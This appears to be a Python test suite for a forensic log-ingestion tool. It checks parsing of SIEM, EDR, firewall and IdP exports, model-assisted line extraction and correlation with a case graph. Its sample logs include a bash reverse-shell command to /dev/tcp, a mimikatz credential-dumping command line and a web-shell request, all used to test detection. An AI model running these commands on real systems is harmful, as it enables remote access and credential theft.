"""Log data attached to a case (SIEM / firewall / EDR / IdP exports) is read
without a parser per vendor, and joins the case only where it meets it.

Executed against the real code: services/fusion/external_logs.py (shapes, column
detection, the model fallback), mappers/external.py and correlate.assemble.
"""
import gzip
import json
import os
import sys
import tempfile
import unittest

for _p in (os.path.dirname(os.path.abspath(__file__)),
           os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "modules/backend")):
    if _p not in sys.path:
        sys.path.insert(0, _p)

import _optional_deps  # noqa: F401,E402
from services.fusion import correlate, external_logs as X, schema  # noqa: E402
from services.fusion.mappers.external import map_external  # noqa: E402

ELASTIC = json.dumps({"hits": {"hits": [{"_source": {
    "@timestamp": "2026-10-01T10:00:00Z", "host": {"name": "WS01"}, "user": {"name": "CORP\\jdoe"},
    "source": {"ip": "10.0.0.5"}, "destination": {"ip": "185.220.101.4", "port": 443},
    "event": {"action": "allowed", "severity": 3}}}]}})
OKTA = "\n".join(json.dumps({"published": f"2026-10-01T10:0{i}:00Z", "actor": {"alternateId": "jdoe@corp.com"},
                             "client": {"ipAddress": "185.220.101.4"}, "eventType": "user.session.start",
                             "outcome": {"result": "FAILURE"}, "severity": "WARN"}) for i in range(5))
DEFENDER = ("Timestamp,DeviceName,AccountName,FileName,SHA256,ProcessCommandLine,AlertTitle,Severity\n"
            "2026-10-01T10:05:00Z,WS01,CORP\\jdoe,mimi.exe," + "a" * 64
            + ",mimi.exe sekurlsa::logonpasswords,Credential dumping,High\n"
            "2026-10-01T10:06:00Z,WS01,CORP\\jdoe,cmd.exe," + "b" * 64 + ",cmd /c whoami,Recon,Low\n")
CEF = ("Oct  1 10:00:00 fw01 CEF:0|Palo Alto Networks|PAN-OS|10.1|threat|Command and Control Traffic|8|"
       "rt=2026-10-01T10:00:00Z src=10.0.0.5 dst=185.220.101.4 suser=CORP\\jdoe dhost=evil-c2.com act=alert\n") * 3
LEEF = ("LEEF:1.0|Microsoft|MSExchange|2016|15345|src=10.50.1.1\tdst=2.10.20.20\tsev=5"
        "\tdevTime=2026-10-01T10:00:00Z\tusrName=CORP\\jdoe\n") * 3
FORTI = "\n".join(f'date=2026-10-01 time=10:0{i}:00 devname="FG100" srcip=10.0.0.5 dstip=185.220.101.{i} '
                  f'action="deny" user="jdoe" level="warning"' for i in range(4))
FREE = ("2026-10-01 10:00:01 sshd[311]: Failed password for CORP\\jdoe from 185.220.101.4 port 22 ssh2\n"
        "service restarted\n"
        "2026-10-01 10:00:09 sshd[311]: Accepted password for CORP\\jdoe from 185.220.101.4 port 22 ssh2\n")


def _read(text):
    fmt, rows = X.parse(text)
    m = X.detect_columns(rows) if rows else {}
    return fmt, m, (X.normalize(rows, m) if rows else [])


class Shapes(unittest.TestCase):
    """One reader per SHAPE; the columns are found from the schemas' names."""

    def test_each_export_is_recognized_with_its_columns(self):
        for name, text, fmt, want in (
                ("elastic", ELASTIC, "json", {"ts": "@timestamp", "host": "host.name", "user": "user.name",
                                              "src_ip": "source.ip", "dst_ip": "destination.ip"}),
                ("okta", OKTA, "jsonl", {"ts": "published", "user": "actor.alternateId",
                                         "src_ip": "client.ipAddress", "rule": "eventType"}),
                ("okta alert", OKTA + "\n" + json.dumps({"published": "2026-10-01T10:09:00Z",
                                                         "displayMessage": "Password spray", "eventType": "x"}),
                 "jsonl", {"rule": "displayMessage"}),
                ("defender", DEFENDER, "csv", {"ts": "Timestamp", "host": "DeviceName", "hash": "SHA256",
                                               "rule": "AlertTitle", "severity": "Severity"}),
                ("cef", CEF, "cef", {"ts": "rt", "src_ip": "src", "dst_ip": "dst", "user": "suser",
                                     "domain": "dhost", "rule": "cefname"}),
                ("leef", LEEF, "leef", {"src_ip": "src", "dst_ip": "dst", "severity": "sev"}),
                ("fortigate", FORTI, "kv", {"ts": "date", "src_ip": "srcip", "dst_ip": "dstip"})):
            with self.subTest(name):
                got_fmt, m, rows = _read(text)
                self.assertEqual(fmt, got_fmt)
                for f, col in want.items():
                    self.assertEqual(col, m.get(f), (f, m))
                self.assertTrue(rows and rows[0]["n"])

    def test_values_are_normalized(self):
        _, m, rows = _read(DEFENDER)
        self.assertTrue(X.recognized(rows))
        self.assertEqual(["high", "low"], [r["n"]["severity"] for r in rows])
        self.assertEqual("2026-10-01T10:05:00", rows[0]["n"]["ts"][:19])
        _, _, rows = _read(CEF)
        self.assertEqual("high", rows[0]["n"]["severity"], "CEF 0..10: 8 is high")
        _, _, rows = _read(FORTI)
        self.assertEqual("2026-10-01T10:01:00", rows[1]["n"]["ts"][:19], "date + time columns joined")
        self.assertNotIn("severity", rows[0]["n"], "'warning' is an operational level, not an alert")
        _, _, rows = _read(OKTA)
        self.assertNotIn("severity", rows[0]["n"])

    def test_unknown_column_names_are_found_by_their_values(self):
        text = "when,who,peer,what\n" + "\n".join(
            f"2026-10-01T10:0{i}:00Z,CORP\\u{i},185.220.101.{i},x" for i in range(5))
        _, m, _ = _read(text)
        self.assertEqual({"ts": "when", "user": "who", "src_ip": "peer"}, {k: m[k] for k in ("ts", "user", "src_ip")})

    def test_a_records_own_column_beats_a_nested_childs(self):
        """An M365 incident carries its own severity and each alert's; the
        incident's is the row's. OCSF severity_id is a severity too."""
        rows = [{"createdTime": "2026-10-01T10:05:00Z", "incidentName": "Multi-stage incident", "severity": "medium",
                 "alerts.severity": "low", "alerts.title": "x"}] * 3
        n = X.normalize(rows, X.detect_columns(rows))
        self.assertEqual("medium", n[0]["n"]["severity"])
        rows = [{"time": 1790849100000, "type": "INCIDENT_CREATION", "severity_id": 4, "type_id": 8075}] * 3
        self.assertEqual("high", X.normalize(rows, X.detect_columns(rows))[0]["n"]["severity"])

    def test_a_rows_own_time_zone_is_honoured(self):
        """Sophos XG writes local date + time and names the zone; a time with its
        own offset keeps it."""
        def ts(row):
            return X.normalize([row] * 3, X.detect_columns([row] * 3))[0]["n"]["ts"]
        self.assertEqual("2020-05-18T12:38:48", ts({"date": "2020-05-18", "time": "14:38:48", "timezone": "CEST",
                                                    "src_ip": "10.0.0.5"}))
        self.assertEqual("2017-01-31T08:46:19", ts({"date": "2017-01-31", "time": "14:16:19", "timezone": "+05:30",
                                                    "src_ip": "10.0.0.5"}))
        self.assertEqual("2017-01-31T14:16:19", ts({"timestamp": "2017-01-31T14:16:19Z", "timezone": "IST",
                                                    "src_ip": "10.0.0.5"}))

    def test_a_windows_event_level_is_no_severity(self):
        """Winlogbeat's event.severity is the Windows Level: 4 = Information."""
        rows = [{"@timestamp": "2024-04-22T09:31:15Z", "event.severity": 4, "event.code": "257",
                 "winlog.channel": "Microsoft-Windows-DNSServer/Analytical", "winlog.computer_name": "DC01"}] * 3
        self.assertNotIn("severity", X.detect_columns(rows))
        rows = [{"timestamp": "2026-10-01T10:05:00Z", "severity": 4, "DeviceName": "WS01", "Title": "x"}] * 3
        self.assertEqual("severity", X.detect_columns(rows)["severity"], "an EDR's 1..5 still counts")

    def test_a_relay_is_not_the_subject(self):
        """A container's / collector's host name says where the log passed, not
        which machine the event is about."""
        rows = [{"time": "2026-10-01T10:05:00Z", "container.host_name": "k8s-node-7", "device_name": "WS01.corp.local",
                 "collector.hostname": "siem-collector-1", "type_id": 8031}] * 3
        self.assertEqual("device_name", X.detect_columns(rows)["host"])

    def test_one_bad_spot_in_event_xml_loses_only_itself(self):
        ev = ("<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='P'/>"
              "<EventID>4104</EventID><Channel>Microsoft-Windows-PowerShell/Operational</Channel></System>"
              "<EventData><Data Name='ScriptBlockText'>Get-DomainComputer {n}</Data></EventData></Event>")
        text = "\r\n".join([ev.format(n=1), "garbage & < here", ev.format(n=2), ev.format(n=3).replace("</Data>", "")])
        rows = X._xml_rows(text)
        self.assertEqual(["Get-DomainComputer 1", "Get-DomainComputer 2"], [r["ScriptBlockText"] for r in rows])

    def test_gzip_and_utf16_are_read(self):
        d = tempfile.mkdtemp()
        p = os.path.join(d, "a.gz")
        with gzip.open(p, "wb") as f:
            f.write(DEFENDER.encode())
        self.assertEqual(DEFENDER, X.read_text(p))
        p2 = os.path.join(d, "b.csv")
        with open(p2, "wb") as f:
            f.write(DEFENDER.encode("utf-16"))
        self.assertEqual(DEFENDER, X.read_text(p2))

    def test_free_text_is_not_a_structure(self):
        self.assertEqual(("", []), X.parse(FREE))

    def test_auditd_enriched_separator_is_not_a_line_break(self):
        d = tempfile.mkdtemp()
        p = os.path.join(d, "audit.log")
        rec = ("type=ADD_USER msg=audit(1722960000.100:%d): pid=1 uid=0 auid=0 ses=1 msg='op=adding user "
               "id=1001 exe=\"/usr/sbin/useradd\" hostname=web01 addr=? terminal=pts/0 res=success'\x1dUID=\"root\"\n")
        with open(p, "w") as f:
            f.write("".join(rec % i for i in range(5)))
        fm, rows, left = X.read(X.read_text(p))
        self.assertEqual(("kv", 5, 0), (fm, len(rows), len(left)))
        self.assertEqual(("ADD_USER", "/usr/sbin/useradd", "root"), (rows[0]["type"], rows[0]["exe"], rows[0]["UID"]))

    def test_auditd_path_records_stay_structured(self):
        # PATH / CWD records have no host or address; as text no auditd rule saw them.
        text = "\n".join(f"type=CWD msg=audit(1764000000.{i}:{i}): cwd=\"/etc\"\n"
                          f"type=PATH msg=audit(1764000000.{i}:{i}): item=0 name=\"sudoers\" inode=1 nametype=NORMAL"
                          for i in range(3))
        fm, rows, _ = X.read(text)
        self.assertTrue(X.recognized(X.normalize(rows, X.detect_columns(rows))))
        self.assertEqual("/etc/sudoers", [r for r in rows if r["type"] == "PATH"][0]["full_path"])

    def test_auditd_user_space_record_fields(self):
        row = X._kv_row("type=SERVICE_STOP msg=audit(1722965459.146:15207): pid=1 uid=0 auid=4294967295 "
                        "ses=4294967295 subj=unconfined msg='unit=auditd comm=\"systemd\" "
                        "exe=\"/usr/lib/systemd/systemd\" hostname=? addr=? terminal=? res=success'"
                        "UID=\"root\" AUID=\"unset\"")
        self.assertEqual(("auditd", "systemd", "success", "audit(1722965459.146:15207)"),
                         (row.get("unit"), row.get("comm"), row.get("res"), row.get("msg")))
        self.assertNotIn("hostname", row)                  # "?" is none

    def test_cisco_estreamer_intrusion_event(self):
        # A bare dash ("Impact":-) broke the JSON; PriorityID is the IDS scale (1 = worst);
        # the rule is IntrusionRuleMessage; UserID 9999997 is "no authentication", no user.
        line = ('{"EventType":"IntrusionEvent", "EventSecond":1740804347, "InitiatorIP":"23.48.99.12", '
                '"ResponderIP":"172.16.3.110", "ResponderPort":51500, "PriorityID":%d, "SignatureID":62710, '
                '"Impact":-, "IntrusionRuleMessage":"MALWARE-OTHER Win.Malware.Lumma variant download attempt", '
                '"UserID":9999997}')
        fm, rows, _ = X.read("\n".join(line % p for p in (1, 1, 2, 3)))
        n = X.normalize(rows, X.detect_columns(rows))
        self.assertEqual("jsonl", fm)
        self.assertEqual(["high", "high", "medium", "low"], [r["n"].get("severity") for r in n])
        self.assertEqual("MALWARE-OTHER Win.Malware.Lumma variant download attempt", n[0]["n"]["rule"])
        self.assertNotIn("user", n[0]["n"])

    def test_a_dash_is_no_user(self):
        # 4688 by a service: TargetUserName "-", the account is the subject.
        rows = [{"TimeCreated": "2026-10-01T10:00:00Z", "Computer": "WS01", "SubjectUserName": "AR-WIN-DC$",
                 "TargetUserName": "-", "NewProcessName": "C:\\Windows\\System32\\cmd.exe"}] * 3
        n = X.normalize(rows, X.detect_columns(rows))
        self.assertEqual("AR-WIN-DC$", n[0]["n"].get("user"))

    def test_splunk_search_export_is_unwrapped(self):
        line = ('{"preview":false,"result":{"eventType":"AwsApiCall","eventName":"UpdateSAMLProvider",'
                '"sourceIPAddress":"66.176.252.11","userIdentity.principalId":"AROA:rsoto@splunk.local"}}')
        fm, rows, _ = X.read("\n".join([line] * 3))
        self.assertEqual(("jsonl", "UpdateSAMLProvider"), (fm, rows[0].get("eventName")))
        self.assertNotIn("preview", rows[0])

    def test_name_value_pairs_are_fields(self):
        # Google Reports keeps an event's details as [{"name": ..., "value"/"multiValue": ...}]
        r = X.sigma_event(X._flat({"event": {"name": "login_failure", "parameters": [
            {"name": "login_type", "value": "google_password"},
            {"name": "login_challenge_method", "multiValue": ["password", "google_authenticator"]}]}}))
        self.assertEqual("google_password", r["event.parameters.login_type"])
        self.assertEqual("password, google_authenticator", r["event.parameters.login_challenge_method"])
        self.assertIn("event.parameters", r)                # the JSON text stays
        self.assertNotIn("x.a", X.sigma_event(X._flat({"x": [{"a": 1, "b": 2, "c": 3, "d": 4}, {"a": 5}]})))  # not pairs
        self.assertEqual(1, X.sigma_event(X._flat({"x": [{"a": 1, "b": 2, "c": 3, "d": 4}]}))["x.a"])  # one object
        # For the rules only: an O365 "Parameters" pair named Priority once became the
        # severity column, so every transport-rule change read as an alert.
        rows = [{"CreationTime": "2026-10-01T10:00:00", "Operation": "New-TransportRule", "UserId": "a@b.com",
                 "Parameters": [{"Name": "Priority", "Value": "2"}, {"Name": "Name", "Value": "fwd"}]}] * 3
        fm, got, _ = X.read("\n".join(__import__("json").dumps(r) for r in rows))
        n = X.normalize(got, X.detect_columns(got))
        self.assertIsNone(n[0]["n"].get("severity"))

    def test_a_change_list_has_old_and_new_fields(self):
        r = X.sigma_event(X._flat({"Operation": "Update user.", "ModifiedProperties": [
            {"Name": "StrongAuthenticationMethod", "NewValue": "[{MethodType: 6}]", "OldValue": "[]"}]}))
        self.assertEqual("[{MethodType: 6}]", r["ModifiedProperties.StrongAuthenticationMethod.NewValue"])
        self.assertEqual("[]", r["ModifiedProperties.StrongAuthenticationMethod.OldValue"])
        r = X.sigma_event(X._flat({"targetResources": {"modifiedProperties": [
            {"displayName": "AccountEnabled", "oldValue": "[false]", "newValue": "[true]"}]}}))
        self.assertEqual("[true]", r["targetResources.modifiedProperties.AccountEnabled.NewValue"])

    def test_osquery_host_identifier_is_the_host(self):
        # Rows of other osquery tables carry nothing else to join on; without the host
        # the file was "not recognised" and read as text, so no process rule ran.
        rows = [{"name": "pack_osquery", "hostIdentifier": "MacBookPro", "calendarTime": "Thu Feb 19 13:49:32 2026 UTC",
                 "action": "added", "columns": {"version": "5.10"}}] * 3
        n = X.normalize([X._flat(r) for r in rows], X.detect_columns([X._flat(r) for r in rows]))
        self.assertEqual("MacBookPro", n[0]["n"].get("host"))
        self.assertTrue(X.recognized(n))

    def test_squid_native_access_log(self):
        # Padded columns and "TCP_MISS/200": read as unnamed columns, no web rule saw it.
        text = "\n".join(["1157689312.049   5006 10.105.21.199 TCP_MISS/200 19763 CONNECT login.yahoo.com:443 "
                          "badeyek DIRECT/209.73.177.115 -",
                          "1157689320.327    864 10.105.21.199 TCP_DENIED/403 10182 GET http://evil.example/x.jsp?cmd=id "
                          "- NONE/- text/html"] * 3)
        fm, rows, _ = X.read(text)
        self.assertEqual("squid-native", fm)
        self.assertEqual({"src_ip": "10.105.21.199", "action": "TCP_DENIED", "status": "403", "method": "GET",
                          "url": "http://evil.example/x.jsp?cmd=id", "hierarchy": "NONE"},
                         {k: rows[1][k] for k in ("src_ip", "action", "status", "method", "url", "hierarchy")})
        self.assertNotIn("dst_ip", rows[1])                 # "-" is empty
        self.assertNotIn("user", rows[1])


class FreeText(unittest.TestCase):
    """Not recognized -> the case's model reads it, and nothing it says is kept
    unless the line it cites says it too. No model -> indicator lines."""

    def test_without_a_model_every_line_is_kept_with_its_indicators(self):
        rows = X.indicator_rows(FREE.splitlines())
        self.assertEqual([1, 2, 3], [r["raw"]["line"] for r in rows], "a line with no IP is kept for the rules")
        self.assertNotIn("ips", rows[1]["n"])
        self.assertEqual(["185.220.101.4"], rows[0]["n"]["ips"])
        self.assertEqual(["CORP\\jdoe"], rows[0]["n"]["users"])
        self.assertEqual("2026-10-01T10:00:01", rows[0]["n"]["ts"][:19])

    def _fake(self, answer, seen):
        def call(system, user):
            seen.append(user)
            return json.dumps(answer)
        return call

    def test_the_model_cannot_add_what_the_line_does_not_say(self):
        seen = []
        answer = [{"line": 1, "ts": "2026-10-01T10:00:01", "user": "CORP\\jdoe", "src_ip": "185.220.101.4",
                   "host": "DC01", "rule": "failed login", "severity": "high"},
                  {"line": 99, "user": "CORP\\jdoe"},
                  {"line": 2, "host": "WEB7"}]
        rows, st = X.llm_extract(FREE.splitlines(), call=self._fake(answer, seen))
        self.assertEqual(1, len(rows))
        n = rows[0]["n"]
        self.assertEqual(("CORP\\jdoe", "185.220.101.4"), (n["user"], n["src_ip"]))
        self.assertNotIn("host", n, "DC01 is not in the line")
        self.assertNotIn("severity", n, "the line states no severity")
        self.assertEqual("2026-10-01T10:00:01", n["ts"][:19])
        self.assertEqual((2, 1), (st["dropped"], st["values_dropped"]))
        self.assertTrue(seen[0].startswith("L1: "), "lines are numbered for citing")

    def test_the_time_comes_from_the_line_not_the_model(self):
        lines = ["Oct  1 10:05:07 web01 sshd[1]: Failed password for root from 185.220.101.4 port 1 ssh2"]
        call = lambda s, u: json.dumps([{"line": 1, "ts": "Oct 1 10:05:07", "user": "root",
                                         "src_ip": "185.220.101.4", "action": "Failed password"}])
        rows, _ = X.llm_extract(lines, call=call)
        self.assertTrue(rows[0]["n"]["ts"].endswith("-10-01T10:05:07"), rows[0]["n"])

    def test_masked_text_goes_out_and_answers_come_back_unmasked(self):
        from services.data_anonymizer import DataAnonymizer
        from services.fusion import investigate
        mask = DataAnonymizer()
        text = "2026-10-01 10:00:01 login failed for CORP\\jdoe from 10.20.30.40 on host DESKTOP-ABC123\n"
        seen = []

        def call(system, user):
            seen.append(user)
            # the model answers in the masked vocabulary it was shown: the words
            # after "for" and "from" in the line it got
            words = user.split()
            return json.dumps([{"line": 1, "user": words[words.index("for") + 1],
                                "src_ip": words[words.index("from") + 1]}])
        rows, _ = X.llm_extract(text.splitlines(), call=call, mask=mask,
                                revert=lambda o: investigate._revert_obj(o, mask))
        for secret in ("jdoe", "10.20.30.40", "DESKTOP-ABC123"):
            self.assertNotIn(secret, seen[0])
        self.assertEqual(("CORP\\jdoe", "10.20.30.40"), (rows[0]["n"]["user"], rows[0]["n"]["src_ip"]))


class IngestAndSearch(unittest.TestCase):
    """The run writes its rows where fusion and evidence drill-down read a run's
    rows; chat's logs() tool searches them, including rows not in the graph."""

    def setUp(self):
        from unittest import mock
        self.tmp = tempfile.mkdtemp()
        self.p = [mock.patch.object(X, "downloads_dir", lambda rid: os.path.join(self.tmp, rid))]
        for p in self.p:
            p.start()
        self.logs = []

    def tearDown(self):
        for p in self.p:
            p.stop()

    def _ingest(self, text, model=None, name="f.log"):
        from unittest import mock
        src = os.path.join(self.tmp, name)
        with open(src, "w") as f:
            f.write(text)
        with mock.patch.object(X, "_model", lambda *a: model):
            s = X.ingest("c", "external_log_1", src, "edr", lambda m, l="info": self.logs.append(m))
        with open(os.path.join(self.tmp, "external_log_1", "raw_results.json")) as f:
            return s, json.load(f)["External.edr"]

    def test_a_recognized_export_is_parsed(self):
        s, rows = self._ingest(DEFENDER)
        self.assertEqual(("parser", 2, 1), (s["via"], s["rows"], s["alerts"]))
        self.assertEqual("WS01", rows[0]["n"]["host"])
        self.assertEqual("mimi.exe", rows[0]["raw"]["FileName"], "the original row is kept for evidence")

    def test_the_type_can_be_left_to_the_reader(self):
        from unittest import mock
        src = os.path.join(self.tmp, "x.csv")
        with open(src, "w") as f:
            f.write(DEFENDER)
        with mock.patch.object(X, "_model", lambda *a: None):
            s = X.ingest("c", "external_log_1", src, "auto", lambda m, l="info": self.logs.append(m))
        self.assertEqual("edr", s["data_type"])
        with open(os.path.join(self.tmp, "external_log_1", "raw_results.json")) as f:
            self.assertIn("External.edr", json.load(f))
        self.assertIn("this looks like EDR data", self.logs)

    def test_a_pure_log_gets_its_detections_from_the_rules(self):
        """A plain auth.log: no product verdict anywhere. Sigma (the reverse shell)
        and the behaviour rules (the brute force) find what is in it."""
        lines = [f"Oct  1 10:0{5 + i // 8}:{i * 7 % 60:02d} web01 sshd[22]: Failed password for root from "
                 f"185.220.101.4 port {50000 + i} ssh2" for i in range(14)]
        lines.append("Oct  1 10:08:30 web01 sshd[23]: Accepted password for root from 185.220.101.4 port 1 ssh2")
        lines.append("Oct  1 10:09:00 web01 sudo: root : COMMAND=/bin/bash -i >& /dev/tcp/185.220.101.4/4444 0>&1")
        if not os.path.isdir("/opt/sigma-rules/rules"):
            self.skipTest("SigmaHQ rules not installed here")
        s, rows = self._ingest("\n".join(lines))
        alerts = [r["n"] for r in rows if r["n"].get("severity") in ("medium", "high", "critical")]
        by = {a["rule"]: a for a in alerts}
        self.assertIn("Brute force then success", by)
        self.assertTrue(any("sigma: " in d for a in alerts for d in a.get("detected_by", [])), alerts)
        self.assertEqual(1, s["behaviour"])
        self.assertGreaterEqual(s["sigma"]["rows_hit"], 1)

    def test_free_text_with_no_model_keeps_indicator_lines(self):
        s, rows = self._ingest(FREE)
        self.assertEqual(("indicators", 3), (s["via"], s["rows"]))

    def test_a_failing_model_still_keeps_the_file(self):
        def boom(system, user):
            raise RuntimeError("provider down")
        s, rows = self._ingest(FREE, model=(boom, None, None))
        self.assertEqual(("indicators", 3), (s["via"], s["rows"]))
        self.assertTrue(any("could not read them" in m for m in self.logs), self.logs)

    def test_the_model_reads_what_no_parser_understood(self):
        call = lambda system, user: json.dumps([{"line": 3, "user": "CORP\\jdoe", "src_ip": "185.220.101.4",
                                                 "rule": "accepted password"}])
        s, rows = self._ingest(FREE, model=(call, None, None))
        self.assertEqual(("llm", 1), (s["via"], s["rows"]))
        self.assertEqual(3, rows[0]["raw"]["line"])

    def test_chat_search_reads_the_rows(self):
        from unittest import mock
        self._ingest(DEFENDER)
        runs = [{"run_id": "external_log_1", "automation_type": "external_log",
                 "details": {"file_name": "alerts.csv", "data_type": "edr", "use_in_analysis": True}}]
        from services.fusion import store
        load = lambda rid, det, log=None: json.load(open(os.path.join(self.tmp, rid, "raw_results.json")))
        with mock.patch("services.workflow_service.get_automation_runs_by_case", lambda cid: runs), \
                mock.patch.object(store, "_agentic_collected_data", load):
            r = X.search("c", "sekurlsa ws01")
            self.assertEqual((1, "alerts.csv", "WS01"), (r["total_matches"], r["files"][0], r["rows"][0]["host"]))
            from services.fusion import keys
            r = X.search("c", "ws01", lo=keys.to_utc_dt("2026-10-01T10:05:30Z"))
            self.assertEqual(1, r["total_matches"], "the time window applies")
            runs[0]["details"]["use_in_analysis"] = False
            self.assertEqual(0, X.search("c", "ws01")["total_matches"], "a switched-off log is not searched")


ENDPOINT = "asset:endpoint:C.1"


def _fuse(external_rows, data_type="edr"):
    ext = map_external({X.artifact_name(data_type): external_rows}, run_id="external_log_1",
                       data_type=data_type, label="export.csv")
    endpoint = ([schema.Entity(id=ENDPOINT, type="asset", label="WS01", attrs={"hostname": "WS01"},
                               sources=["velociraptor"]),
                 schema.Entity(id="ioc:ip:185.220.101.4", type="ioc", label="185.220.101.4",
                               attrs={"_assets": [ENDPOINT], "ioc_kind": "ip"}, sources=["velociraptor"])], [])
    return correlate.assemble("c", [endpoint, ext], ["r1", "external_log_1"])


class Fusion(unittest.TestCase):

    def test_a_vendor_alert_is_a_finding_on_the_case_host(self):
        _, m, rows = _read(DEFENDER)
        g = _fuse(rows)
        f = [f for f in g.findings if "Credential dumping" in f.title]
        self.assertEqual(1, len(f), [x.title for x in g.findings])
        self.assertEqual([ENDPOINT], f[0].asset_ids, "WS01 in the log is the case's WS01")
        self.assertEqual("high", f[0].severity)
        self.assertFalse([x for x in g.findings if "Recon" in x.title], "a Low row is not an alert")
        self.assertIn("ioc:hash:" + "a" * 64, g.entities, "the alert's hash stays (the alert is about it)")

    def test_only_what_meets_the_case_stays(self):
        rows = [{"n": {"ts": "2026-10-01T10:00:00", "src_ip": "10.0.0.5", "dst_ip": f"185.220.{i}.9"}, "raw": {}}
                for i in range(1, 60)]
        rows.append({"n": {"ts": "2026-10-01T10:00:00", "src_ip": "10.0.0.5", "dst_ip": "185.220.101.4"},
                     "raw": {}})
        g = _fuse(rows, "firewall")
        ioc = g.entities.get("ioc:ip:185.220.101.4")
        self.assertIsNotNone(ioc)
        self.assertEqual({"velociraptor", "external"}, set(ioc.sources), "seen by both: one node")
        self.assertEqual([ENDPOINT], ioc.attrs["_assets"], "the firewall is not a second host")
        self.assertNotIn("ioc:ip:185.220.7.9", g.entities, "only in the log: searchable, not a node")
        self.assertFalse([e for e in g.entities if e.startswith("asset:log_source:")],
                         "a log source with nothing left on it is not shown as a host")
        self.assertFalse([f for f in g.findings if f.kind == "cross_host"])

    def test_an_alert_naming_no_host_sits_on_the_log_source(self):
        rows = [{"n": {"ts": "2026-10-01T10:00:00", "user": "jdoe@corp.com", "src_ip": "185.220.101.4",
                       "rule": "Impossible travel", "severity": "high"}, "raw": {}}]
        g = _fuse(rows, "idp")
        f = [f for f in g.findings if "Impossible travel" in f.title]
        self.assertEqual(["asset:log_source:external_log_1"], f[0].asset_ids)
        self.assertIn("account:domain:corp\\jdoe", g.entities)


if __name__ == "__main__":
    unittest.main()
